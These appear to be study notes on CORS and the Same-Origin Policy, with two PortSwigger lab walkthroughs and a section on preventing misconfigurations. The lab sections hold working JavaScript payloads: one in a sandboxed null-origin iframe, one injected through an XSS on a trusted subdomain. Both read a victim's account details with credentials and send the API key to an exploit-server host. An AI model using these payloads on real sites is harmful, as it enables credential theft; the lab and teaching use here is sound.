# Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a browser security feature that allows a web page from one domain (the "origin") to access resources on another domain. It is an extension of the Same-Origin Policy (SOP) and provides a way to relax its restrictions in a controlled manner.

While CORS adds flexibility, a misconfigured policy can open the door to cross-domain attacks. It is important to note that **CORS is not a protection against Cross-Site Request Forgery (CSRF)**.

## Same-Origin Policy (SOP)

The Same-Origin Policy is a fundamental security mechanism that restricts how a document or script loaded from one **origin** can interact with a resource from another origin.

An "origin" is defined by the combination of the **protocol** (e.g., `http`, `https`), **hostname** (e.g., `www.example.com`), and **port** (e.g., `80`, `443`). If all three match, the origins are the same.

**Example:**
If a page is loaded from `https://www.example.com`, the following table shows which URLs it can and cannot access data from according to the SOP:

| URL | Same Origin? | Reason |
| :--- | :---: | :--- |
| `https://www.example.com/page.html` | Yes | Same protocol, host, and port. |
| `http://www.example.com` | No | Different protocol (HTTP vs. HTTPS). |
| `https://store.example.com` | No | Different hostname (subdomain). |
| `https://www.example.com:8080` | No | Different port. |

!!! tip "SOP"
	The SOP generally allows a domain to *send* requests to other domains, but it prevents the requesting domain from *reading* the responses.

## How CORS Works

CORS allows servers to explicitly specify which origins are permitted to access their resources. This is done through HTTP headers.

- **`Access-Control-Allow-Origin`:** This is the most important CORS header. The server includes this header in its response to indicate which origins are allowed. For example:

```http
Access-Control-Allow-Origin: https://www.trusted-site.com
```

A wildcard (`*`) can be used, but this is often insecure as it allows any domain to access the resource.

- **`Access-Control-Allow-Credentials: true`**: Indicates cross-origin requests can include cookies.  

- **Preflight Requests:** For requests that can modify data (e.g., `PUT`, `DELETE`) or use certain headers, the browser first sends a "preflight" request using the `OPTIONS` method. This request checks if the server understands and approves the actual request. If the server responds favorably to the `OPTIONS` request, the browser then sends the actual request.




## Parsing Errors

Be sure to check for errors in `Origin` header parsing.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

Maybe try:

- hackersnormal-website.com
- normal-website.com.evil-user.net

Also check arbitrary subdomains:

- evil.normal-website.com

## Whilelisted NULL origin value

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

??? example "PortSwigger CORS lab 2: CORS vulnerability with trusted null origin"

	**Instructions**
	
	This website has an insecure CORS configuration in that it trusts the "null" origin.
	
	To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
	
	You can log in to your own account using the following credentials: `wiener:peter`
	
	**Exploit**
	
	The website shows an API key on the `accountDetails` page.
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801160740.png)
	
	Sending an arbitrary domain in the request Origin header does nothing
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801160842.png)
	
	However, sending `null` gets reflected in the response ACAO header.
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801160956.png)
	
	Since the null origin is reflected, we can use the following payload to snag the admin's API key.
	
	```
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
	  var req = new XMLHttpRequest();
	  req.onload = reqListener;
	  req.open('get','https://0adb00af04759e1980f703df00da0006.web-security-academy.net/accountDetails',true);
	  req.withCredentials = true;
	  req.send();
	
	  function reqListener() {
	    location='https://exploit-0a310064045b9e858037027701af008a.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
	   };
	</script>"></iframe> 
	```
	
	Nice. We got the request from the admin containing the API key.
	
	Submit the key and solve the lab. 

## Exploiting XSS via CORS Trust Relationships

If the vulnerable site trusts an origin that is vulnerable to XSS, then the attacker might be able to inject JavaScript on the *trusted* site that uses CORS to steal sensitive information from the *trusting* site. 

??? example "PortSwigger CORS Lab 3: CORS vulnerability with trusted insecure protocols"

	**Instructions**
	
	This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
	
	To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
	
	You can log in to your own account using the following credentials: `wiener:peter`
	
	**Exploit**
	
	Like other labs in this section, there is an API key on the `accountDetails` page. 
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801163107.png)
	
	After looking around a little bit, we find that the application is making a call to the insecure site `http://stock.0a5000e703c1293d806a497d00c200d4.web-security-academy.net`. Checking the client-side code when we check the stock of an item shows the following JavaScript code:
	
	```html
	<script>
	    const stockCheckForm = document.getElementById("stockCheckForm");
	    stockCheckForm.addEventListener("submit", function(e) {
		    const data = new FormData(stockCheckForm);
		    window.open('http://stock.0a5000e703c1293d806a497d00c200d4.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
	        e.preventDefault();
	    });
	</script>
	```
	
	Note that `storeId` takes user input and puts it directly into the request. Seems interesting.
	
	Sending the following request triggers an alert
	
	```
	https://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=1%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
	```
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801170237.png)
	
	Check that the `stock` subdomain is trusted.
	
	And it is. 
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801170438.png)
	
	We can inject the basic CORS exploit payload into the XSS on the `shop` subdomain. 
	
	So the request URL would become
	
	```
	<script>
	document.location="http://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac4000c033411d480bf1bcb01920034.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
	</script>
	```
	
	Put that in your exploit server and deliver to victim. 
	
	![](../../../assets/screenshots/cors/Pasted%20image%2020250801172657.png)
	
	Submit the API key to solve the lab.



## Breaking TLS with Poorly Configured CORS

Be sure to check if CORS accepts insecure `http` sites. 


## Preventing CORS Misconfigurations

- If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header. 
- Do not dynamically reflect arbitrary origins in the ACAO header.
- Avoid whitelisting `null` origins. 
- Avoid using wildcards on internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.

!!! warning "Warning from PortSwigger"

	CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.








